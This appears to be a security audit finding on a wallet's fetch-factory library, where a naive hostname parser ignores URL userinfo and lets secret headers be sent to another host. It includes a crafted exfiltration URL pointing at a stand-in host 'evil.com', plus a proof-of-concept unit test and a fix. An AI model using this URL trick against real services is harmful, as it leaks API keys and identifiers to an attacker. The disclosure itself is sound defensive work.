### Title
Userinfo/host confusion in `getUrlHostname` lets attacker-controlled URLs steal EXODUS_HOST secret headers by disguising them as a URL "port" - (File: adapters/fetch-factory/src/hostname.js)

### Summary
`hostnameFromString` in `adapters/fetch-factory/src/hostname.js` naively looks for the first `:` after the `://` separator and treats everything before it as the hostname, without ever checking for a `@` (userinfo) delimiter. WHATWG URL parsing (used by the real `fetchFn`/`Request`/`fetch`) instead splits on the *last* `@` before the path, treating anything before it — including a `host:password`-looking string — as userinfo, and takes the text after `@` as the actual host. This divergence lets an attacker choose a URL such as `https://exodus.io:secret@evil.com/steal` where `#buildHeaders` attaches EXODUS_HOST-scoped secrets while the real HTTP request goes to `evil.com`.

### Finding Description
`hostnameFromString` (`adapters/fetch-factory/src/hostname.js:11-37`) processes the substring after `://` as follows: it first checks for a `:` (`portIndex`) and, if found, immediately slices to that point, validates it as a hostname, and **returns early** — before ever checking for `/`, `?`, or crucially `@`. [1](#0-0) 

For the URL `https://exodus.io:secret@evil.com/steal`:
- `hostnameFromString` computes the substring after `://` as `exodus.io:secret@evil.com/steal`, finds `:` at the position right after `exodus.io`, and returns `exodus.io` (a syntactically valid hostname per `isValidHostname`) — completely ignoring the trailing `@evil.com`.
- The real destination, per the WHATWG URL Standard implemented by `fetch`/`Request`/`new URL()`, parses `exodus.io:secret` as `username:password` userinfo and `evil.com` as the actual host. The request from `this.fetchFn(url, options)` (`adapters/fetch-factory/src/fetch-factory.js:148-151`) is therefore sent to `evil.com`.

In `#buildHeaders` (`adapters/fetch-factory/src/fetch-factory.js:93-120`), the mismatched `hostname` (`exodus.io`) is matched against `this.headerConfigs`, causing any headers configured via `setHeaders(headers, [EXODUS_HOST])` (e.g. `x-api-key`) and `setDefaultExodusIdentifierHeaders` (`x-exodus-app-id`, `x-exodus-version`, `x-requested-with`) to be attached to a request that is actually sent to the attacker-controlled `evil.com`. [2](#0-1) [3](#0-2) 

No existing guard catches this: `isValidHostname` only validates character composition of the (already mis-parsed) substring, it does not re-validate against the actual URL parser's notion of "host". The existing test suite (`adapters/fetch-factory/__tests__/global-fetch.test.js:195-199`) even demonstrates that a trailing `:port`-shaped token after the apparent hostname is treated as authoritative, confirming the exploitable code path is reachable and "intended" behavior for legitimate ports, but unguarded against userinfo abuse.

### Impact Explanation
Any code path that calls `factory.create()(url)` with an attacker-influenced `url` (e.g. a URL fed from remote config, a dapp/RPC parameter, or any string not fully controlled by the wallet) can cause the wallet to leak the `x-api-key` secret registered for `exodus.io` plus app identifier headers (`x-exodus-app-id`, `x-exodus-version`, `x-requested-with`) to an attacker-chosen origin (`evil.com`), since the header-attachment decision and the actual network destination are derived from two different, disagreeing URL parsers. This matches a secret-disclosure / API-key-exfiltration impact.

### Likelihood Explanation
Exploitation only requires the attacker to control (fully or partially) the URL string that ends up passed into the function returned by `FetchFactory#create()`, which is plausible for remote-config-driven endpoints or RPC/dapp-supplied URLs. Crafting the payload requires no special privileges — just a syntactically valid-looking URL with a `host:password@otherhost` pattern, which is trivially reproducible and deterministic.

### Recommendation
Replace the manual string-parsing in `hostname.js` with the platform `URL` parser (`new URL(urlOrPath, base).hostname`) to guarantee `getUrlHostname` and the actual `fetchFn`/`Request` resolve identical hostnames, eliminating any possibility of divergence from userinfo, backslashes, or other authority-parsing edge cases.

### Proof of Concept
Unit test to add to `adapters/fetch-factory/__tests__/global-fetch.test.js`:
```js
test('userinfo host-confusion should not leak exodus headers to a different host', async () => {
  const fetchFactory = new FetchFactory(fetchFn)
  fetchFactory.setHeaders({ 'x-api-key': 'super-secret' }, [hosts.EXODUS_HOST])

  // Real destination host is evil.com; getUrlHostname must NOT resolve to exodus.io
  const result = await fetchFactory.create()('https://exodus.io:secret@evil.com/steal')

  expect(result).not.toHaveProperty('x-api-key')
})
```
Differential fuzz test: for a corpus including `scheme://host:password@evilhost/...`, `scheme://host\@evilhost/...`, encoded-slash and backslash variants, assert `getUrlHostname(url) === new URL(url).hostname` for every case; the userinfo-colon case above demonstrates a concrete divergence (`exodus.io` vs `evil.com`).

### Citations

**File:** adapters/fetch-factory/src/hostname.js (L17-23)
```javascript
  let hostname = url.slice(protocolSeparatorStart + PROTOCOL_SEPARATOR.length)

  const portIndex = hostname.indexOf(':')
  if (portIndex !== -1) {
    hostname = hostname.slice(0, portIndex)
    return isValidHostname(hostname) ? hostname : null
  }
```

**File:** adapters/fetch-factory/src/fetch-factory.js (L100-111)
```javascript
    const hostname = getUrlHostname(url)
    if (hostname) {
      const matchedDomain = Object.keys(this.headerConfigs).find((key) => {
        return hostname === key || hostname.endsWith(`.${key}`)
      })

      if (matchedDomain) {
        Object.entries(this.headerConfigs[matchedDomain]).forEach(([key, value]) => {
          headers.set(key, value)
        })
      }
    }
```

**File:** adapters/fetch-factory/src/fetch-factory.js (L141-151)
```javascript
      let url
      if (urlOrRequest instanceof URL) {
        url = urlOrRequest.href
      } else {
        url = urlOrRequest
      }

      const headers = this.#buildHeaders(url, opts.headers)
      const options = { ...opts, headers }

      return this.fetchFn(url, options, ...args)
```
